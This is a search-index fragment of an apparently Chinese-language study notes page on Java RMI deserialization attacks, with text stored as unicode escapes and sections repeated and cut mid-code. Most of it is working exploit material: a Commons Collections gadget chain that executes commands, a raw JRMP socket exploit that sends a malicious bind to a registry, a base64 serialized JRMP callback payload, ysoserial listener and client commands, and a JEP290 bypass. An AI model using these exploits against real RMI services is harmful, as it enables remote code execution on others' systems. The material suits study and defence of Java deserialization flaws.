\u5982\u679c\u4e0d\u6307\u5b9a\u8fde\u63a5\u53c2\u6570\u9ed8\u8ba4\u8fde\u63a5\u672c\u5730RMI\u670d\u52a1 args = new String [] { \"127.0.0.1\" , String . valueOf ( 1099 ), \"calc.exe\" }; } // \u8fdc\u7a0bRMI\u670d\u52a1IP final String host = args [ 0 ] ; // \u8fdc\u7a0bRMI\u670d\u52a1\u7aef\u53e3 final int port = Integer . parseInt ( args [ 1 ] ); // \u9700\u8981\u6267\u884c\u7684\u7cfb\u7edf\u547d\u4ee4 final String command = args [ 2 ] ; Socket s = null ; DataOutputStream dos = null ; try { // \u521b\u5efa\u6076\u610f\u7684Payload\u5bf9\u8c61 Object payloadObject = CC5 . getPayload ( command ); InetSocketAddress isa = new InetSocketAddress ( host , port ); // \u5efa\u7acb\u548c\u8fdc\u7a0bRMI\u670d\u52a1\u7684Socket\u8fde\u63a5 s = SocketFactory . getDefault (). createSocket ( host , port ); s . setKeepAlive ( true ); s . setTcpNoDelay ( true ); // \u83b7\u53d6Socket\u7684\u8f93\u51fa\u6d41\u5bf9\u8c61 OutputStream os = s . getOutputStream (); // \u5c06Socket\u7684\u8f93\u51fa\u6d41\u8f6c\u6362\u6210DataOutputStream\u5bf9\u8c61 dos = new DataOutputStream ( os ); // \u5411\u8fdc\u7a0bRMI\u670d\u52a1\u7aefSocket\u5199\u5165RMI\u534f\u8bae\u5e76\u901a\u8fc7JRMP\u4f20\u8f93Payload\u5e8f\u5217\u5316\u5bf9\u8c61 dos . writeInt ( TransportConstants . Magic ); // \u9b54\u6570 dos . writeShort ( TransportConstants . Version ); // \u7248\u672c dos . writeByte ( TransportConstants . SingleOpProtocol ); // \u534f\u8bae\u7c7b\u578b dos . write ( TransportConstants . Call ); // RMI\u8c03\u7528\u6307\u4ee4 ObjectOutputStream objOut = new MarshalOutputStream ( dos ); objOut . writeLong ( 0 ); // RegistryImpl_Skel objOut . writeInt ( 0 ); objOut . writeLong ( 0 ); objOut . writeShort ( 0 ); objOut . writeInt ( 0 ); // bind objOut . writeLong ( 4905912898345647071L ); // \u63a5\u53e3Hash\u503c\uff0c\u8fd9\u91cc\u662f\u56fa\u5b9a\u7684 // \u5199\u5165\u6076\u610f\u7684\u5e8f\u5217\u5316\u5bf9\u8c61 objOut . writeObject ( payloadObject ); os . flush (); } finally { // \u5173\u95edSocket\u8f93\u51fa\u6d41 if ( dos != null ) { dos . close (); } // \u5173\u95edSocket\u8fde\u63a5 if ( s != null ) { s . close (); } } } } \u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u5ba2\u6237\u7aef # \u8fd9\u4e2a\u653b\u51fb\u4e00\u822c\u662f\u4ee5\u4e0b\u6d41\u7a0b: \u6211\u4eec\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u8ba9\u5176\u4f5c\u4e3a\u5ba2\u6237\u7aef\u4e3b\u52a8\u8fde\u63a5\u6211\u4eec\u672c\u5730\u7684\u6076\u610f\u6ce8\u518c\u4e2d\u5fc3\uff0c\u6ce8\u518c\u4e2d\u5fc3\u518d\u8fd4\u56de\u4e00\u4e2a\u6076\u610f\u6784\u9020\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0c\u5ba2\u6237\u7aef\u5c06\u5176\u53cd\u5e8f\u5217\u5316\u4ece\u800c\u6700\u7ec8\u9020\u6210\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u5e38\u7528\u4e8e\u7ed5\u8fc7waf\u548c\u6d4b\u8bd5gadget \u5728\u4e86\u89e3\u8fd9\u4e2a\u653b\u51fb\u65b9\u5f0f\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u53bb\u4e86\u89e3RMI\u534f\u8bae\uff0c\u53c2\u8003\u6587\u7ae0: attack-rmi-registry-and-server-with-socket \u5177\u4f53\u4ee3\u7801\u53c2\u8003ysoserial\u4e2d\u7684exploit/JRMPListener\u3002 \u653b\u51fb\u6d41\u7a0b # \u8fd0\u884c java -jar ysoserial.jar JRMPClient 127.0.0.1:2099 | base64 -w 0 \u751f\u6210\u4e00\u6bb5\u6076\u610f\u5e8f\u5217\u5316\u5bf9\u8c61\u8ba9\u5176\u56de\u8fde\u6211\u4eec\u7684\u6076\u610f\u6ce8\u518c\u4e2d\u5fc3 \u8fd0\u884c java -cp ysoserial.jar ysoserial.exploit.JRMPListener 2099 CommonsCollections5 \"calc.exe\" \u542f\u52a8\u4e00\u4e2a\u6076\u610f\u7684\u6ce8\u518c\u4e2d\u5fc3 \u624b\u52a8\u6a21\u62df\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u70b9 ```java package top.longlone.RMIStudy; import sun.misc.BASE64Decoder; import java.io.*; public class vuln { public static void main(String[] args) throws IOException, ClassNotFoundException { // \u4e0a\u8ff0base64\u4e4b\u540e\u7684\u5e8f\u5217\u5316\u5bf9\u8c61\uff0c\u5176\u4f1a\u56de\u8fde\u6211\u4eec127.0.0.1:2099\u7684\u6076\u610f\u6ce8\u518c\u4e2d\u5fc3 byte[] data = new BASE64Decoder().decodeBuffer(\"rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3MgAKVW5pY2FzdFJlZgAJMTI3LjAuMC4xAAAIMwAAAABkqebwAAAAAAAAAAAAAAAAAAAAeA==\"); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject(); } } `` 4. \u8fd0\u884c\u4e0a\u8ff0\u4ee3\u7801\uff0c\u6210\u529f\u5728\u5ba2\u6237\u7aef\u5f39\u51fa\u8ba1\u7b97\u5668: ![](https://gitee.com/guuest/images/raw/master/img/20211118112950.png) \u5176\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u7684\u4f4d\u7f6e\u5728 sun.rmi.registry.RegistryImpl_Stub#lookup`: \u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3 # \u8fd9\u79cd\u653b\u51fb\u65b9\u5f0f\u4e0d\u592a\u5e38\u89c1(\u56e0\u4e3a\u6ce8\u518c\u4e2d\u5fc3\u4e00\u822c\u4e0d\u53ef\u80fd\u66b4\u9732\u5728\u5916\u7f51)\uff0c\u6211\u4eec\u8fd9\u91cc\u6765\u6a21\u62df\u653b\u51fb\u4e00\u4e0b: \u5728\u4e86\u89e3\u8fd9\u4e2a\u653b\u51fb\u65b9\u5f0f\u4e4b\u524d\uff0c\u6211\u4eec\u540c\u6837\u9700\u8981\u53bb\u4e86\u89e3RMI\u534f\u8bae\uff0c\u53c2\u8003\u6587\u7ae0: attack-rmi-registry-and-server-with-socket \u5177\u4f53\u4ee3\u7801\u53c2\u8003ysoserial\u4e2d\u7684exploit/JRMPClient\u3002 \u653b\u51fb\u6d41\u7a0b # \u8fd0\u884c\u5f00\u5934\u7684\u6ce8\u518c\u4e2d\u5fc3\u4ee3\u7801\uff0c\u542f\u52a8\u4e00\u4e2a\u6b63\u5e38\u7684\u6ce8\u518c\u4e2d\u5fc3 \u8fd0\u884c java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 2099 CommonsCollections5 \"calc.exe\" \uff0c\u6210\u529f\u5728\u6ce8\u518c\u4e2d\u5fc3\u5f39\u51fa\u8ba1\u7b97\u5668 \u5176\u539f\u7406\u662fRMI\u6846\u67b6\u91c7\u7528DGC(Distributed Garbage Collection)\u5206\u5e03\u5f0f\u5783\u573e\u6536\u96c6\u673a\u5236\u6765\u7ba1\u7406\u8fdc\u7a0b\u5bf9\u8c61\u7684\u751f\u547d\u5468\u671f,\u53ef\u4ee5\u901a\u8fc7\u4e0eDGC\u901a\u4fe1\u7684\u65b9\u5f0f\u53d1\u9001\u6076\u610fpayload\u8ba9\u6ce8\u518c\u4e2d\u5fc3\u53cd\u5e8f\u5217\u5316\u3002 \u5176\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u7684\u4f4d\u7f6e\u5728 sun.rmi.transport.DGCImpl_Skel#dispatch : JEP290 # \u53c2\u8003\u4e00\u4e9b\u5e08\u5085\u7684\u6587\u7ae0\uff0c\u5728JDK8u121\uff0cJDK7u13\uff0cJDK6u141\u4e4b\u540e\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u5b89\u5168\u673a\u5236JEP290\uff0c\u6838\u5fc3\u5176\u5b9e\u5c31\u662f\u589e\u52a0\u4e86\u4e00\u4e2a ObjectInputFilter \u63a5\u53e3\uff0c\u53ef\u4ee5\u5c06 filter \u8bbe\u7f6e\u7ed9 ObjectInputStream \u5bf9\u8c61\uff0c\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u89e6\u53d1 filter \u7684\u68c0\u6d4b\u673a\u5236\u3002 \u8fd9\u4e2a\u8fc7\u6ee4\u7684\u767d\u540d\u5355\u6211\u4eec\u6700\u7ec8\u53ef\u4ee5\u5728 RegistryImpl#registryFilter \u65b9\u6cd5\u4e2d\u770b\u5230: \u767d\u540d\u5355\u7684\u5185\u5bb9\u5982\u4e0b: String / Number / Remote / Proxy / UnicastRef / RMIClientSocketFactory / RMIServerSocketFactory / ActivationID / UID \u53ea\u8981\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u4e0d\u662f\u767d\u540d\u5355\u4e2d\u7684\u7c7b\uff0c\u5c31\u4f1a\u8fd4\u56de REJECTED \u64cd\u4f5c\u7b26\uff0c\u8868\u793a\u5e8f\u5217\u5316\u6d41\u4e2d\u6709\u4e0d\u5408\u6cd5\u7684\u5185\u5bb9\uff0c\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u3002 Bypass 8u121~8u230 # UnicastRef \u7c7b # UnicastRef \u662f\u5728\u767d\u540d\u5355\u4e0a\u7684\uff0cRMI Server \u6216\u8005 Client \u548c Registry \u7684\u901a\u4fe1\u5c31\u57fa\u4e8e\u5b83\u3002\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ea\u8981\u901a\u8fc7\u5728\u76ee\u6807\u4e0a\u53cd\u5e8f\u5217\u5316\u8fd9\u4e2a\u7c7b\uff0c\u5b83\u5c31\u4f1a\u53d1\u8d77\u4e00\u4e2aJRMP\u8fde\u63a5\uff0c\u8bf7\u6c42\u6211\u4eec\u63a7\u5236\u7684\u6076\u610f\u6ce8\u518c\u4e2d\u5fc3\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec \u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u5ba2\u6237\u7aef \u7684\u539f\u7406\u3002 RemoteObject \u7c7b # RemoteObject \u662f\u4e00\u4e2a\u62bd\u8c61\u7c7b\uff0c\u5728\u540e\u9762\u7684 Bypass \u601d\u8def\u6784\u9020\u4e2d\u5b83\u4f1a\u626e\u6f14\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u89d2\u8272\u3002\u5b83\u5b9e\u73b0\u4e86 Remote \u548c Serializable \u63a5\u53e3\uff0c\u4ee3\u8868\u5b83\uff08\u53ca\u5176\u5b50\u7c7b\uff09\u53ef\u4ee5\u901a\u8fc7\u767d\u540d\u5355\u7684\u68c0\u6d4b\uff0c\u800c Bypass \u5229\u7528\u7684\u5173\u952e\u70b9\u5c31\u662f\u5b83\u7684 readObject \u65b9\u6cd5\u3002\u6211\u4eec\u7f16\u5199\u4ee5\u4e0b\u4ee3\u7801\u624b\u52a8\u6a21\u62df\u653b\u51fb: package top.longlone.RMIStudy ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; public class RMIRegistry { public static void main ( String [] args ) { try { LocateRegistry . createRegistry ( 2099 ); } catch ( RemoteException e ) { e . printStackTrace (); } while ( true ) ; } } package top.longlone.RMIStudy ; import sun.misc.BASE64Decoder ; import sun.rmi.server.UnicastRef ; import sun.rmi.transport.LiveRef ; import sun.rmi.transport.tcp.TCPEndpoint ; import java.io.* ; import java.rmi.AlreadyBoundException ; import java.rmi.registry.LocateRegistry ; import java.rmi.registry.Registry ; import java.rmi.server.ObjID ; import java.rmi.server.RemoteObjectInvocationHandler ; import java.util.Random ; public class vuln { public static void main ( String [] args ) throws IOException , ClassNotFoundException , AlreadyBoundException { Registry registry = LocateRegistry . getRegistry ( 2099 ); ObjID id = new ObjID ( new Random (). nextInt ()); TCPEndpoint te = new TCPEndpoint ( \"127.0.0.1\" , 9999 ); UnicastRef ref = new UnicastRef ( new LiveRef ( id , te , false )); RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler ( ref ); // lookup\u65b9\u6cd5\u4e5f\u53ef\u4ee5\uff0c\u4f46\u9700\u8981\u624b\u52a8\u6a21\u62dflookup\u65b9\u6cd5\u7684\u6d41\u7a0b registry . rebind ( \"pwn\" , handler ); } } \u8c03\u8bd5\u8fc7\u7a0b\u5982\u4e0b: \u7528ysoserial\u542f\u52a8JRMPClient\uff0c\u7136\u540e\u8c03\u8bd5RMIRegistry\uff0c\u5728 RemoteObject#readObject \u65b9\u6cd5\u4e2d\u4e0b\u65ad\u70b9\uff0c\u6700\u540e\u518d\u8fd0\u884cvuln\u89e6\u53d1\u65ad\u70b9\u3002 \u8ddf\u8fdbreadExternal\u65b9\u6cd5: \u5728\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u4f1a\u8bfb\u51fa\u5e8f\u5217\u5316\u6d41\u4e2d\u7684 host \u548c\u7aef\u53e3\u4fe1\u606f\uff0c\u7136\u540e\u91cd\u65b0\u5c01\u88c5\u6210\u4e00\u4e2a LiveRef \u5bf9\u8c61\uff0c\u5c06\u5176\u5b58\u50a8\u5230\u5f53\u524d\u7684 ConnectionInputStream \u4e0a\uff0c\u8c03\u7528 saveRef \u65b9\u6cd5: \u4e00\u76f4\u8ddf\u8fdb\u5230RegistryImpl_Skel\u7684oldDispatch\u65b9\u6cd5: \u5728\u670d\u52a1\u7aef\u89e6\u53d1\u4e86\u53cd\u5e8f\u5217\u5316\u4e4b\u540e\uff0c\u6765\u5230 StreamRemoteCall#releaseInputStream \u65b9\u6cd5\u4e2d\uff0c\u5728\u8fd9\u91cc\u4f1a\u8c03\u7528 ConnectionInputStream#registerRefs \u65b9\u6cd5: \u8fd9\u91cc\u53c8\u4f1a\u8c03\u7528DGCClient\u7684registerRefs\u65b9\u6cd5: \u6700\u7ec8\u7531 DGCClient \u5411\u6076\u610f\u7684 JRMP \u6ce8\u518c\u4e2d\u5fc3\u53d1\u8d77 lookup \u8fde\u63a5: \u8fd9\u91cc\u7684\u653b\u51fb\u65b9\u6cd5\u770b\u8d77\u6765\u4e0e\u4e0a\u9762\u7684 \u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u5ba2\u6237\u7aef \u6709\u70b9\u7c7b\u4f3c\uff0c\u4f46\u662f\u8fd9\u91cc\u7528\u7684\u4e0d\u662f\u76f4\u63a5\u53cd\u5e8f\u5217\u5316\u800c\u662f\u901a\u8fc7\u5f80\u6ce8\u518c\u4e2d\u5fc3rebind\u6076\u610f\u5bf9\u8c61\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u9020\u6210\u7684\uff0c\u5176\u6700\u7ec8\u76ee\u7684\u90fd\u662f\u4e3a\u4e86 \u8ba9\u670d\u52a1\u7aef\u53d8\u4e3aJRMP\u5ba2\u6237\u7aef\u5411\u6211\u4eec\u6076\u610f\u7684JRMPRegistry\u53d1\u8d77JRMP\u8bf7\u6c42 \u3002 \u603b\u7ed3 # \u6240\u4ee5 Bypass JEP290 \u7684\u5173\u952e\u5728\u4e8e\uff1a \u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u8ba9\u670d\u52a1\u7aef\u53d8\u4e3aJRMP\u5ba2\u6237\u7aef\u5411\u6211\u4eec\u6076\u610f\u7684JRMPRegistry\u53d1\u8d77 JRMP \u8bf7\u6c42\u3002 Bypass 8u231~8u240 # TODO: \u4f7f\u7528\u4e86UnicastRemoteObject\uff0c\u540e\u8865 \u53c2\u8003\u6587\u7ae0 # https://paper.seebug.org/1194 https://xz.aliyun.com/t/8247","title":"RMI"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#rmi","text":"\u6211\u4eec\u77e5\u9053RMI\u5728\u6574\u4e2a\u8c03\u7528\u6d41\u7a0b\u65f6\u90fd\u4f1a\u51fa\u73b0\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece\u4e2d\u5229\u7528\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","title":"RMI"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u653b\u51fb\u65b9\u6cd5","text":"","title":"\u653b\u51fb\u65b9\u6cd5"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u670d\u52a1\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3","text":"\u5f53\u670d\u52a1\u7aef\u5728bind\u65f6\uff0c\u5b9e\u9645\u4e0a\u4e5f\u662f\u5411\u6ce8\u518c\u4e2d\u5fc3\u5e8f\u5217\u5316\u4f20\u8f93\u5bf9\u8c61\uff0c\u6ce8\u518c\u4e2d\u5fc3\u518d\u5c06\u5176\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u6765\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3(JEP 290\u4e4b\u524d)\u3002 \u6ce8\u518c\u4e2d\u5fc3\u4ee3\u7801: package top.longlone.RMIStudy ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; public class RMIRegistry { public static void main ( String [] args ) { try { LocateRegistry . createRegistry ( 2099 ); } catch ( RemoteException e ) { e . printStackTrace (); } while ( true ) ; } } \u670d\u52a1\u5668\u6784\u9020\u4e00\u4e2a\u6076\u610f\u5bf9\u8c61\u5e76\u5c06\u5176\u4f20\u8f93\u7ed9\u6ce8\u518c\u4e2d\u5fc3\uff0c\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e2a\u5bf9\u8c61\u9700\u8981\u5b9e\u73b0\u4e86Remote\u63a5\u53e3\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u4f7f\u7528\u4e86\u52a8\u6001\u4ee3\u7406\u7684\u6280\u672f\uff0c\u5c06\u6076\u610f\u7684\u7c7b\u5957\u5728AnnotationInvocationHandler\u7684map\u4e2d\uff0c\u518d\u52a8\u6001\u4ee3\u7406\u5b9e\u73b0Remote\u63a5\u53e3\u4f7f\u7528: package top.longlone.RMIStudy ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.keyvalue.TiedMapEntry ; import org.apache.commons.collections.map.LazyMap ; import javax.management.BadAttributeValueExpException ; import java.lang.reflect.Constructor ; import java.lang.reflect.Field ; import java.lang.reflect.InvocationHandler ; import java.lang.reflect.Proxy ; import java.rmi.Remote ; import java.rmi.RemoteException ; import java.rmi.registry.LocateRegistry ; import java.rmi.registry.Registry ; import java.util.HashMap ; import java.util.Map ; public class HelloServer { public static void main ( String [] args ) throws Exception { try { Transformer [] transformers = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class [] . class }, new Object [] { \"getRuntime\" , new Class [ 0 ] }), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object [] . class }, new Object [] { null , new Object [ 0 ] }), new InvokerTransformer ( \"exec\" , new Class [] { String . class }, new Object [] { \"calc.exe\" }), }; Transformer transformer = new ChainedTransformer ( transformers ); Map innerMap = new HashMap (); Map ouputMap = LazyMap . decorate ( innerMap , transformer ); TiedMapEntry tiedMapEntry = new TiedMapEntry ( ouputMap , \"pwn\" ); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException ( null ); Field field = badAttributeValueExpException . getClass (). getDeclaredField ( \"val\" ); field . setAccessible ( true ); field . set ( badAttributeValueExpException , tiedMapEntry ); Map tmpMap = new HashMap (); tmpMap . put ( \"pwn\" , badAttributeValueExpException ); Constructor <?> ctor = null ; ctor = Class . forName ( \"sun.reflect.annotation.AnnotationInvocationHandler\" ). getDeclaredConstructor ( Class . class , Map . class ); ctor . setAccessible ( true ); InvocationHandler invocationHandler = ( InvocationHandler ) ctor . newInstance ( Override . class , tmpMap ); Remote remote = Remote . class . cast ( Proxy . newProxyInstance ( HelloServer . class . getClassLoader (), new Class [] { Remote . class }, invocationHandler )); Registry registry = LocateRegistry . getRegistry ( 2099 ); registry . bind ( \"hello1\" , remote ); } catch ( Exception e ) { e . printStackTrace (); } } }","title":"\u670d\u52a1\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u653b\u51fb\u6d41\u7a0b","text":"\u5f00\u542f\u6ce8\u518c\u4e2d\u5fc3 \u8fd0\u884c\u670d\u52a1\u7aef\u4ee3\u7801 \u6ce8\u518c\u4e2d\u5fc3\u53cd\u5e8f\u5217\u5316\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668 \u5176\u89e6\u53d1\u7684\u53cd\u5e8f\u5217\u5316\u4f4d\u7f6e\u5728 sun.rmi.registry.RegistryImpl_Skel#dispatch :","title":"\u653b\u51fb\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u670d\u52a1\u7aef","text":"\u53c2\u8003 \u8fd9\u7bc7\u6587\u7ae0 \u6839\u636e\u4e0a\u6587\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684\u4ee3\u7801\u4e2d\u4f7f\u7528\u4e86 registry.bind \uff0c\u5176\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u539f\u751f\u7684 RegistryImpl_Stub \uff0c\u4f1a\u89e6\u53d1 UnicastRef#invoke->StreamRemoteCall#executeCall \u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\uff0c\u4e5f\u5c31\u662f\u8bf4\u5f53\u6211\u4eec\u670d\u52a1\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3\u65f6\u6ce8\u518c\u4e2d\u5fc3\u4e5f\u53ef\u80fd\u4f1a\u5bf9\u6211\u4eec\u8fdb\u884c\u653b\u51fb\u3002 \u6bd4\u5982\u6211\u4eec\u5e38\u7528\u7684ysoserial\u4e2d\u7684 RMIRegistryExploit \uff0c\u5176\u4ee3\u7801\u5982\u4e0b: public static void main ( final String [] args ) throws Exception { final String host = args [ 0 ] ; final int port = Integer . parseInt ( args [ 1 ] ); final String command = args [ 3 ] ; Registry registry = LocateRegistry . getRegistry ( host , port ); final String className = CommonsCollections1 . class . getPackage (). getName () + \".\" + args [ 2 ] ; final Class <? extends ObjectPayload > payloadClass = ( Class <? extends ObjectPayload > ) Class . forName ( className ); // test RMI registry connection and upgrade to SSL connection on fail try { registry . list (); } catch ( ConnectIOException ex ) { registry = LocateRegistry . getRegistry ( host , port , new RMISSLClientSocketFactory ()); } // ensure payload doesn't detonate during construction or deserialization exploit ( registry , payloadClass , command ); } public static void exploit ( final Registry registry , final Class <? extends ObjectPayload > payloadClass , final String command ) throws Exception { new ExecCheckingSecurityManager (). callWrapped ( new Callable < Void > (){ public Void call () throws Exception { ObjectPayload payloadObj = payloadClass . newInstance (); Object payload = payloadObj . getObject ( command ); String name = \"pwned\" + System . nanoTime (); Remote remote = Gadgets . createMemoitizedProxy ( Gadgets . createMap ( name , payload ), Remote . class ); try { registry . bind ( name , remote ); } catch ( Throwable e ) { e . printStackTrace (); } Utils . releasePayload ( payloadObj , payload ); return null ; }}); } \u53ef\u4ee5\u770b\u5230ysoserial\u4e5f\u4f7f\u7528\u4e86 registry.list \u548c registry.bind \uff0c\u6240\u4ee5\u4e5f\u5b58\u5728\u6f0f\u6d1e\u3002","title":"\u6ce8\u518c\u4e2d\u5fc3\u653b\u51fb\u670d\u52a1\u7aef"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#\u653b\u51fb\u6d41\u7a0b_1","text":"\u4f7f\u7528ysoserial\u542f\u52a8\u4e00\u4e2a\u6076\u610f\u7684\u6ce8\u518c\u4e2d\u5fc3: java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe \u7a0d\u5fae\u4fee\u6539\u4e0a\u9762\u7684\u670d\u52a1\u7aef\u4ee3\u7801\uff0c\u5c06\u547d\u4ee4\u6267\u884c\u6539\u4e3a notepad.exe \uff0c\u7136\u540e\u8fd0\u884c \u670d\u52a1\u7aef\u53cd\u5e8f\u5217\u5316\uff0c\u5f39\u51fa\u8ba1\u7b97\u5668(\u800c\u975e\u8bb0\u4e8b\u672c)","title":"\u653b\u51fb\u6d41\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/RMI/#ysoserial\u53cd\u5236\u4e0e\u9632\u8303","text":"\u6839\u636e\u4e0a\u6587\u6240\u8bf4\uff0c\u6ce8\u518c\u4e2d\u5fc3\u548c\u670d\u52a1\u7aef\u5b9e\u9645\u4e0a\u662f\u80fd\u591f\u4e92\u76f8\u653b\u51fb\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u5f53\u6211\u4eec\u653b\u51fb\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e5f\u53ef\u80fd\u906d\u53d7\u653b\u51fb\u3002 \u90a3\u4e48\u6211\u4eec\u8981\u5982\u4f55\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\u5462\uff1f\u7b54\u6848\u662f\u7528socket\u6a21\u62dfJRMP\u534f\u8bae\u53d1\u5305\uff0c\u5176\u5b9e\u4e0e\u540e\u9762\u6587\u7ae0\u4e2d \u5ba2\u6237\u7aef\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3 \u7684ysoserial\u4e2dexploit/JRMPClient\u7684\u4ee3\u7801\u7c7b\u4f3c\uff0c\u53ea\u662f\u6211\u4eec\u89e6\u53d1\u53cd\u5e8f\u5217\u5316\u70b9\u7684\u65b9\u5f0f\u4e0d\u4e00\u6837\u3002 \u8fd9\u91cc\u4e5f\u53c2\u8003\u4e86 attack-rmi-registry-and-server-with-socket \u4e0eysoserial\u4e2dexploit/JRMPClient\u7684\u4ee3\u7801\uff0c\u7a0d\u4f5c\u4fee\u6539\u5373\u53ef\uff0c\u901a\u8fc7\u624b\u52a8\u6a21\u62dfJRMP\u53d1\u5305\u4f5c\u4e3a\u6076\u610f\u670d\u52a1\u7aef\u53d1\u9001\u4e00\u4e2abind\u8bf7\u6c42\u653b\u51fb\u6ce8\u518c\u4e2d\u5fc3\uff0c\u9632\u6b62\u4e86\u53cd\u5236\u3002 package top.longlone.RMIStudy ; import sun.rmi.server.MarshalOutputStream ; import sun.rmi.transport.TransportConstants ; import top.longlone.CC5 ; import javax.net.SocketFactory ; import java.io.DataOutputStream ; import java.io.ObjectOutputStream ; import java.io.OutputStream ; import java.net.InetSocketAddress ; import java.net.Socket ; public class JRMPRegistryExploit { public static void main ( String [] args ) throws Exception { if ( args . length == 0 ) { // \u5982\u679c\u4e0d\u6307\u5b9a\u8fde\u63a5\u53c2\u6570\u9ed8\u8ba4\u8fde\u63a5\u672c\u5730RMI\u670d\u52a1 args = new String [] { \"127.0.0.1\" , String . valueOf ( 1099 ), \"calc.exe\" }; } // \u8fdc\u7a0bRMI\u670d\u52a1IP final String host = args [ 0 ] ; // \u8fdc\u7a0bRMI\u670d\u52a1\u7aef\u53e3 final int port = Integer . parseInt ( args [ 1 ] ); // \u9700\u8981\u6267\u884c\u7684\u7cfb\u7edf\u547d\u4ee4 final String command = args [ 2 ] ; Socket s = null ; DataOutputStream dos = null ; try { // \u521b\u5efa\u6076\u610f\u7684Payload\u5bf9\u8c61 Object payloadObject = CC5 . getPayload ( command ); InetSocketAddress isa = new InetSocketAddress ( host , port ); // \u5efa\u7acb\u548c\u8fdc\u7a0bRMI\u670d\u52a1\u7684Socket\u8fde\u63a5 s = SocketFactory . getDefault (). createSocket ( host , port ); s . setKeepAlive ( true ); s . setTcpNoDelay ( true ); // \u83b7\u53d6Socket\u7684\u8f93\u51fa\u6d41\u5bf9\u8c61 OutputStream os = s . getOutputStream (); // \u5c06Socket\u7684\u8f93\u51fa\u6d41\u8f6c\u6362\u6210DataOutputStream\u5bf9\u8c61 dos = new DataOutputStream ( os ); // \u5411\u8fdc\u7a0bRMI\u670d\u52a1\u7aefSocket\u5199\u5165RMI\u534f\u8bae\u5e76\u901a\u8fc7JRMP\u4f20\u8f93Payload\u5e8f\u5217\u5316\u5bf9\u8c61 dos . writeInt ( TransportConstants . Magic ); // \u9b54\u6570 dos . writeShort ( TransportConstants . Version ); // \u7248\u672c dos . writeByte ( TransportConstants . SingleOpProtocol ); // \u534f\u8bae\u7c7b\u578b dos . write ( TransportConstants . Call 